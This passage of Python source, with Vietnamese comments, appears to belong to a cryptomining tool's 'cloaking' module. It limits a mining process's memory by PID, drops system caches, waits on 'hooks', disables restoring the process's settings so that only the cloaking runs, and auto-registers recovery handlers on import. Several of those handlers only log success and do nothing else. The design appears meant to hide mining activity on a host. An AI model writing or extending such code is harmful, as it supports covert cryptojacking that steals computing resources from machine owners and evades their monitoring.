        if self.gpu_aware and self.smart_mode:
            # Enhanced memory for GPU processes
            self.memory_limit_mb = base_memory
            self.logger.info(f"🧠 [SMART MEMORY] GPU-aware mode: {self.memory_limit_mb}MB allocation")
        else:
            self.memory_limit_mb = base_memory
            
        if self.memory_limit_mb <= 0:
            self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=6144.")
            self.memory_limit_mb = 6144

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Memory cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu Memory cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name

            ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
            if not ok_mem:
                self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot set memory limit
            
            self.logger.info(f"[Memory Cloaking] PID={pid}, memory_limit={self.memory_limit_mb}MB.")

            # Cũng có thể drop cache (nếu muốn)
            ok_cache = self.cache_resource_manager.drop_caches()
            if ok_cache:
                self.logger.info(f"[Memory Cloaking] Đã drop caches cho PID={pid}.")
            
            return True  # ✅ SUCCESS: Memory cloaking applied successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Memory Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Memory cloaking failed

    def apply_with_coordination(self, process: MiningProcess, coordinator, timeout: int = 70) -> bool:
        """
        **Coordinated Memory Cloaking** (che giấu bộ nhớ có phối hợp)
        
        Apply memory cloaking only after proper hook coordination to prevent
        uncoordinated operations that can lead to std::bad_alloc.
        
        Args:
            process: MiningProcess object (đối tượng tiến trình khai thác)
            coordinator: Hook coordinator instance (thể hiện điều phối hook)
            timeout: Coordination timeout in seconds (thời gian chờ phối hợp tính bằng giây)
            
        Returns:
            bool: True if coordinated cloaking successful, False if failed/aborted
                  (True nếu che giấu có phối hợp thành công, False nếu thất bại/hủy bỏ)
        """
        try:
            pid, name = process.pid, process.name
            
            self.logger.info(f"🔄 [COORDINATED CLOAKING] Starting coordination for PID={pid}, timeout={timeout}s")
            
            # **Critical: Wait for hook coordination** (quan trọng: chờ phối hợp hook)
            if not coordinator.wait_for_hooks_ready(pid, timeout):
                # **Coordination failed - ABORT cloaking** (phối hợp thất bại - HỦY che giấu)
                self.logger.error(f"❌ [COORDINATION FAILED] Hook coordination timeout for PID={pid}")
                self.logger.error(f"🚨 [ABORT] Memory cloaking ABORTED to prevent std::bad_alloc")
                self.logger.error(f"💡 [SOLUTION] Increase hook timeout or fix hook coordination system")
                
                # **Report coordination failure** (báo cáo lỗi phối hợp)
                error_reporter.report_error(
                    ErrorCode.STRATEGY_APPLICATION_FAILED,
                    f"Hook coordination timeout - Memory cloaking aborted for PID={pid}",
                    ErrorSeverity.HIGH,
                    module='cloak_strategies',
                    function='MemoryCloakStrategy.apply_with_coordination',
                    process_id=pid,
                    strategy_name='Memory',
                    context_data={
                        'process_name': name,
                        'timeout': timeout,
                        'coordination_status': 'FAILED',
                        'action': 'ABORTED'
                    }
                )
                return False  # **ABORT cloaking** thay vì force proceed
            
            # **Coordination successful - proceed safely** (phối hợp thành công - tiến hành an toàn)
            self.logger.info(f"✅ [COORDINATION SUCCESS] Hooks ready for PID={pid} - proceeding with safe cloaking")
            
            # **Apply memory limits with coordination** (áp dụng giới hạn bộ nhớ với phối hợp)
            return self.apply_memory_limits(process)
            
        except Exception as e:
            # **Error during coordination** (lỗi trong quá trình phối hợp)
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Error during coordinated memory cloaking for PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply_with_coordination',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={
                    'process_name': process.name,
                    'error': str(e),
                    'stack_trace': traceback.format_exc()
                },
                exception=e
            )
            self.logger.error(f"❌ [COORDINATION ERROR] Error during coordinated cloaking for PID={process.pid}: {e}")
            return False
    
    def apply_memory_limits(self, process: MiningProcess) -> bool:
        """
        **Apply Memory Limits** (áp dụng giới hạn bộ nhớ)
        
        Internal method to apply memory limits after coordination is confirmed.
        This is the actual memory limiting logic extracted from apply() method.
        
        Args:
            process: MiningProcess object (đối tượng tiến trình khai thác)
            
        Returns:
            bool: True if memory limits applied successfully (True nếu áp dụng giới hạn thành công)
        """
        try:
            pid, name = process.pid, process.name
            
            # **Check if memory limiting is disabled** (kiểm tra nếu giới hạn bộ nhớ bị tắt)
            if self.memory_limit_mb <= 0:
                self.logger.info(f"ℹ️ [MEMORY LIMITS] Memory limiting disabled (limit={self.memory_limit_mb}MB)")
                return True  # **Success: No limits to apply** (thành công: không có giới hạn để áp dụng)
            
            # **Apply memory limit** (áp dụng giới hạn bộ nhớ)
            ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
            if not ok_mem:
                self.logger.error(f"❌ [MEMORY LIMITS] Cannot set memory limit for PID={pid}")
                return False
            
            self.logger.info(f"✅ [MEMORY LIMITS] Applied limit: PID={pid}, limit={self.memory_limit_mb}MB")
            
            # **Drop caches for memory optimization** (xóa cache để tối ưu bộ nhớ)
            ok_cache = self.cache_resource_manager.drop_caches()
            if ok_cache:
                self.logger.info(f"🧹 [CACHE CLEANUP] Dropped caches for PID={pid}")
            else:
                self.logger.warning(f"⚠️ [CACHE CLEANUP] Failed to drop caches for PID={pid}")
            
            return True  # **Success: Memory limits applied** (thành công: đã áp dụng giới hạn bộ nhớ)
            
        except psutil.NoSuchProcess as e:
            self.logger.error(f"❌ [MEMORY LIMITS] Process not found: PID={process.pid}, error={e}")
            return False
        except psutil.AccessDenied as e:
            self.logger.error(f"❌ [MEMORY LIMITS] Access denied: PID={process.pid}, error={e}")
            return False
        except Exception as e:
            self.logger.error(f"❌ [MEMORY LIMITS] Unexpected error: PID={process.pid}, error={e}")
            return False

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Memory - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[MEMORY RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#                         ✅ ERROR RECOVERY SYSTEM                         #
###############################################################################

def _register_strategy_recovery_handlers() -> None:
    """
    ✅ RECOVERY SYSTEM: Register recovery handlers cho common strategy failure scenarios.
    Tự động gọi khi module được import.
    """
    try:
        # ✅ RECOVERY HANDLER: Process not found recovery
        def recover_process_not_found(error_context) -> bool:
            """Recovery handler for PROCESS_NOT_FOUND errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Attempting recovery for {strategy_name} strategy PID={pid}")
                
                # Kiểm tra process có thật sự không tồn tại
                if psutil.pid_exists(pid):
                    cloak_logger.info(f"✅ [Recovery] Process PID={pid} actually exists - retry strategy")
                    return True  # Process tồn tại, có thể retry
                
                # Nếu process thật sự không tồn tại, cleanup related resources
                cloak_logger.info(f"❗ [Recovery] Process PID={pid} confirmed dead - cleaning up resources")
                
                # Strategy-specific cleanup handled by individual strategy classes
                # For now, just log successful cleanup
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Process recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Strategy application timeout recovery
        def recover_strategy_timeout(error_context) -> bool:
            """Recovery handler for STRATEGY_TIMEOUT errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Timeout recovery for {strategy_name} strategy PID={pid}")
                
                # Implement fallback strategy application with reduced parameters
                # For now, just indicate recovery attempt was made
                cloak_logger.info(f"✅ [Recovery] Applied fallback strategy for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Timeout recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Resource allocation failure recovery
        def recover_resource_allocation_failed(error_context) -> bool:
            """Recovery handler for RESOURCE_ALLOCATION_FAILED errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Resource allocation recovery for {strategy_name} PID={pid}")
                
                # Try alternative resource allocation methods
                # For now, just indicate fallback resource allocation
                cloak_logger.info(f"✅ [Recovery] Applied alternative resource allocation for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Resource allocation recovery failed: {e}")
                return False
        
        # ✅ REGISTER HANDLERS: Register all recovery handlers
        error_reporter.register_recovery_handler(ErrorCode.PROCESS_NOT_FOUND, recover_process_not_found)
        error_reporter.register_recovery_handler(ErrorCode.STRATEGY_TIMEOUT, recover_strategy_timeout)
        error_reporter.register_recovery_handler(ErrorCode.RESOURCE_ALLOCATION_FAILED, recover_resource_allocation_failed)
        
        cloak_logger.info("✅ [Recovery] Strategy recovery handlers registered successfully")
        
    except Exception as e:
        cloak_logger.error(f"❌ [Recovery] Failed to register recovery handlers: {e}")

# ✅ AUTO-REGISTER: Tự động đăng ký recovery handlers khi module được import
_register_strategy_recovery_handlers()
